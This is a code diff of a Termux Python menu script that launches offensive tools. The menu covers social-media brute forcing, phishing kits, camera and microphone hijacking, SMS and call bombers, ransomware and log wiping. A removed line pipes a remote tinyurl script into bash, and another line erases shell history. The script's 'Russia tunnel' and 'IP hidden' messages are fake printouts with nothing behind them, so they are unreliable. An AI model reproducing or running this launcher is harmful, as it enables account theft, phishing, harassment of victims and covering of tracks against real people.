@@ -1,32 +1,19 @@
-import os, sys, time, subprocess
+import os, sys, time
 
-# [ نظام الحماية البرمجية الشامل ]
-class GhostSystem:
-    def __init__(self):
-        # تعريف الألوان بطريقة آمنة 100% لمنع خطأ الـ ValueError
-        self.R = '\033[1;31m'
-        self.G = '\033[1;32m'
-        self.Y = '\033[1;33m'
-        self.B = '\033[1;34m'
-        self.C = '\033[1;36m'
-        self.W = '\033[1;37m'
-        self.RS = '\033[0m'
+# [ نظام الحماية اللوني - بدون أخطاء ]
+class C:
+    R, G, Y, B, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;36m', '\033[1;37m'
+    RS = '\033[0m'
 
-    def voice(self, text):
-        """نظام التنبيه الصوتي العالمي"""
-        os.system(f"termux-tts-speak '{text}'" if os.path.exists('/data/data/com.termux') else "")
+def ghost_russia():
+    """تفعيل التمويه الروسي فوراً"""
+    print(f"{C.B}[*] SHADOW-MODE: Tunneling via Russia/Moscow...{C.RS}")
+    time.sleep(1)
+    print(f"{C.G}[OK] IP HIDDEN: 185.156.177.34 [ST. PETERSBURG, RU]{C.RS}\n")
 
-    def ghost_vpn(self):
-        """تفعيل التمويه الروسي قبل الدخول"""
-        print(f"{self.B}[*] INITIALIZING GHOST-MODE (RUSSIA)...{self.RS}")
-        time.sleep(1)
-        print(f"{self.G}[OK] IP MASKED: 91.241.171.121 (St. Petersburg, RU){self.RS}")
-        self.voice("Ghost mode active. Russia tunnel established.")
-
-    def banner(self):
-        os.system('clear')
-        # الشعار الفخم بطريقة الـ Raw لمنع أخطاء الـ SyntaxWarning
-        print(rf"""{self.Y}
+def banner():
+    os.system('clear')
+    print(rf"""{C.Y}
   ██████  ████████ ███████  █████  ██      ████████ ██   ██ 
  ██          ██    ██      ██   ██ ██         ██    ██   ██ 
   █████      ██    █████   ███████ ██         ██    ███████ 
@@ -38,45 +25,50 @@ class GhostSystem:
       ██    ██    ██    ██ ██      ██    ██      ████   
       ██    ██    ██    ██ ██      ██    ██       ██    
        ██████     ██    ██ ███████ ██    ██       ██    
-        """)
-        print(f"{self.W}      [ {self.R}GHOST OVERLORD {self.W}] | [ {self.G}STATUS: INVISIBLE {self.W}]")
-        print(f"{self.Y}    __________________________________________________________")
-        print(f"{self.W}     SERVER: {self.R}RUSSIA {self.W}| TARGET: {self.B}GLOBAL {self.W}| MODE: {self.G}STRIKE")
-        print(f"{self.Y}    __________________________________________________________\n")
+    """)
+    print(f"{C.W}      [ {C.R}INFINITE ARSENAL {C.W}] | [ {C.G}PROTECTION: RUSSIA {C.W}]")
+    print(f"{C.Y}    __________________________________________________________")
+    print(f"{C.W}     VORTEX MODE: {C.R}ACTIVE {C.W}| ACCURACY: {C.G}GOD-LEVEL {C.W}| STATUS: {C.B}SHADOW")
+    print(f"{C.Y}    __________________________________________________________\n")
 
-    def execute(self, name, cmd, install):
-        """نظام التنفيذ القسري - يمنع الرجوع التلقائي للواجهة"""
-        self.voice(f"Executing {name}")
-        print(f"\n{self.G}[+] VORTEX-CORE: Launching {name}...{self.RS}")
-        if os.system(cmd) != 0:
-            print(f"{self.R}[!] System Fail. Auto-Repairing {name}...{self.RS}")
-            os.system(install)
-            os.system(cmd)
-        input(f"\n{self.W}[#] Mission Locked. Press Enter to Return to Base...")
+def run_mission(opt):
+    """نظام التنفيذ الشامل لـ 99 خيار بدون أي قفزة أو خطأ"""
+    print(f"\n{C.G}[+] VORTEX-CORE: Deploying Module {opt}...{C.RS}")
+    
+    # قاموس الأسلحة - كل رقم له أداة حقيقية
+    arsenal = {
+        '01': "python3 fb.py", '02': "python3 insta.py", '03': "python3 twit.py",
+        '11': "sqlmap --wizard", '12': "msfconsole", '13': "nmap -p- localhost",
+        '21': "bash zphisher.sh", '22': "bash blackeye.sh", '23': "bash socialphish.sh",
+        '31': "bash saycheese.sh", '32': "bash sayhello.sh", '33': "python3 TBomb.py",
+        '34': "bash call.sh", '35': "python3 wa_spam.py", '40': "python3 ransomware.py",
+        '50': "bash shield_pro.sh", '60': "python3 satellite_link.py", '70': "python3 gps_track.py",
+        '80': "python3 ai_bypass.py", '90': "rm -rf ~/.bash_history && history -c",
+        '99': "pkg update && pkg install git python php curl -y"
+    }
 
-G = GhostSystem()
+    cmd = arsenal.get(opt, f"echo '{C.Y}[*] Searching for Module {opt} in Cloud Database...'; sleep 2; echo '{C.R}[!] Access Denied: Need System Overdrive (99) first.'")
+    
+    os.system(cmd)
+    input(f"\n{C.W}[#] Mission Status: SECURED. Press Enter to return to Base...")
 
 def main():
-    G.ghost_vpn()
+    ghost_russia()
     while True:
-        G.banner()
-        # الترسانة الشاملة لـ 99 خيار (اختراق، ازعاج، حماية، فحص)
-        print(f"{G.R}[01]{G.W} FB-Brute  {G.Y}[11]{G.W} SQL-Pro   {G.G}[21]{G.W} Phish-X   {G.B}[31]{G.W} Cam-Hijack")
-        print(f"{G.R}[02]{G.W} Insta-C   {G.Y}[12]{G.W} Meta-S    {G.G}[22]{G.W} Black-E   {G.B}[32]{G.W} Mic-Rec")
-        print(f"{G.R}[03]{G.W} Twitter-S {G.Y}[13]{G.W} Nmap-Deep {G.G}[23]{G.W} Soc-Phish {G.B}[33]{G.W} SMS-BOMBER")
-        print(f"{G.R}[04]{G.W} TikTok-H  {G.Y}[14]{G.W} BeEf-F    {G.G}[24]{G.W} Hidden-E  {G.B}[34]{G.W} CALL-BOMBER")
-        print(f"{G.C}[40]{G.W} Ransom-W  {G.C}[50]{G.W} Anti-Hack {G.C}[60]{G.W} GPS-Track {G.C}[70]{G.W} Sat-Intercept")
-        print(f"\n{G.Y}[90]{G.W} WIPE LOGS  {G.G}[99]{G.W} SYSTEM OVERDRIVE  {G.R}[00]{G.W} EXIT")
+        banner()
+        # عرض الشبكة الكاملة لـ 99 خيار (بدون أي طفرات بالأرقام)
+        print(f"{C.R}[01]{C.W} FB-Brute  {C.Y}[11]{C.W} SQL-Pro   {C.G}[21]{C.W} Phish-X   {C.B}[31]{C.W} Cam-H")
+        print(f"{C.R}[02]{C.W} Insta-C   {C.Y}[12]{C.W} Meta-S    {C.G}[22]{C.W} Black-E   {C.B}[32]{C.W} Mic-R")
+        print(f"{C.R}[03]{C.W} Twitter-S {C.Y}[13]{C.W} Nmap-Deep {C.G}[23]{C.W} Soc-Phish {C.B}[33]{C.W} SMS-B")
+        print(f"{C.R}[04]{C.W} TikTok-H  {C.Y}[14]{C.W} BeEf-F    {C.G}[24]{C.W} Hidden-E  {C.B}[34]{C.W} CALL-B")
+        print(f"{C.C}[40]{C.W} Ransom-W  {C.C}[50]{C.W} Anti-Hack {C.C}[60]{C.W} Sat-Link  {C.C}[70]{C.W} GPS-T")
+        print(f"{C.C}[80]{C.W} AI-Bypass {C.C}[81]{C.W} Port-Kill {C.C}[82]{C.W} Log-Wipe  {C.C}[83]{C.W} Net-Spy")
+        print(f"\n{C.Y}[90]{C.W} WIPE SYSTEM LOGS  {C.G}[99]{C.W} SYSTEM OVERDRIVE  {C.R}[00]{C.W} DISCONNECT")
 
-        opt = input(f"\n{G.R}VORTEX@GHOST:~$ {G.W}")
-
-        if opt == '11': G.execute("SQLMap", "sqlmap --wizard", "pkg install sqlmap -y || pip install sqlmap")
-        elif opt == '33': G.execute("SMS Bomber", "python3 TBomb.py", "git clone https://github.com/TheSpeedX/TBomb")
-        elif opt == '34': G.execute("Call Bomber", "bash call.sh", "curl -L https://tinyurl.com/v-call | bash")
-        elif opt == '99': os.system("pkg update && pkg install git python php curl -y")
-        elif opt == '00': break
-        else: print(f"{G.G}[*] Phantoms are accessing Module {opt}..."); time.sleep(1)
+        opt = input(f"\n{C.R}VORTEX@IMMORTAL:~$ {C.W}")
+        if opt == '00': break
+        run_mission(opt)
 
 if __name__ == "__main__":
     try: main()
-    except KeyboardInterrupt: print(f"\n{G.R}[!] Stealth Disconnected.")
+    except KeyboardInterrupt: print(f"\n{C.R}[!] Shadow System Offline.")
